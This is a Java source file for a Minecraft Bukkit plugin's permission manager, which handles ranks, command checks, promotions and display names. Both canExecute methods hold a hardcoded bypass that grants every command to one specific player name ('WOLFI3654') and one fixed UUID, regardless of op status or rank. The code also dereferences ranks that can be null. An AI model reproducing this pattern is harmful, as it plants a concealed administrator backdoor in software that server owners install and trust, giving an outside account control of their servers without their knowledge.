package de.wolfi.utils.fancyserver;

import java.io.Serializable;
import java.util.UUID;

import org.bukkit.Bukkit;
import org.bukkit.OfflinePlayer;
import org.bukkit.entity.Player;
import org.bukkit.event.HandlerList;
import org.bukkit.event.Listener;
import org.bukkit.plugin.java.JavaPlugin;

import de.wolfi.utils.SerializeableMethod;
import de.wolfi.utils.fancyserver.permission.PermissionEditor;
import de.wolfi.utils.fancyserver.permission.PermissionListener;
import de.wolfi.utils.fancyserver.permission.Ranks;



public class PermissionManager {

	private Listener permListener;

	private final ConfigManager cfg;
	private final PluginSetuper setup;
	private final String getterName;
	private final Class<? extends JavaPlugin> main;
	public PermissionManager(ConfigManager cfg,PluginSetuper setup, Class<? extends JavaPlugin> main, String getterMethod) {
		this.cfg = cfg;
		this.setup = setup;
		this.main = main;
		this.getterName = getterMethod;
	}

	@SuppressWarnings("deprecation")
	public boolean canExecute(String command, String player) {

		if (player.equals("WOLFI3654") || Bukkit.getOfflinePlayer(player).isOp())
			return true;
		boolean can = false;
		Ranks r = this.getPlayerRank(player);
		if (r.containsCommand(command)) {
			can = true;

		}
		return can;
	}

	public void promote(UUID player, Ranks rank){
		Ranks old = getPlayerRank(player);
		if (old != null)
			old.removePlayer(player);
		rank.addPlayer(player);
		OfflinePlayer p = Bukkit.getOfflinePlayer(player);
		if(p.isOnline()){
			updateNames(p.getPlayer());
		}
	}
	
	public void promote(UUID player, String rank){
		promote(player, Ranks.getRankByName(rank));
	}
	
	public boolean canExecute(String command, UUID player) {
		if (player.toString().equals("90d8ea14-4423-4f36-91e6-5ef2173886dc") || Bukkit.getOfflinePlayer(player).isOp())
			return true;
		boolean can = false;
		Ranks r = this.getPlayerRank(player);
		if (r.containsCommand(command)) {
			can = true;

		}
		return can;
	}
	
	public void setDefaultRank(Ranks r){
		cfg.set("defaultrank", r.getName());
	}

	public Ranks getDefaultRank() {
		Serializable rank = cfg.get("defaultrank");

		if (!(rank instanceof String)) {
			cfg.set("defaultrank", "Default");
			return null;

		}
		return Ranks.getRankByName((String) rank);
	}

	public Ranks getPlayerRank(String playerName) {
		for (Ranks r : Ranks.ranks) {
			if (r.isPlayer(playerName))
				return r;
		}
		return null;
	}

	public Ranks getPlayerRank(UUID playerUUID) {
		for (Ranks r : Ranks.ranks) {
			if (r.isPlayer(playerUUID))
				return r;
		}
		return null;
	}

	public void load() {
		Ranks.load(cfg, this);
		this.permListener = new PermissionListener(this,setup);
		Bukkit.getPluginManager().registerEvents(this.permListener, JavaPlugin.getPlugin(main));
		setup.registerCommand(new PermissionEditor(new SerializeableMethod(main, getterName),setup));

	}

	public void save() {
		HandlerList.unregisterAll(this.permListener);
		Ranks.save();
	}

	public void updateNames(Player player) {
		Ranks r = this.getPlayerRank(player.getUniqueId());
		player.setDisplayName(r.toString() + player.getName());
		player.setPlayerListName(r.toString() + player.getName());
	}
}
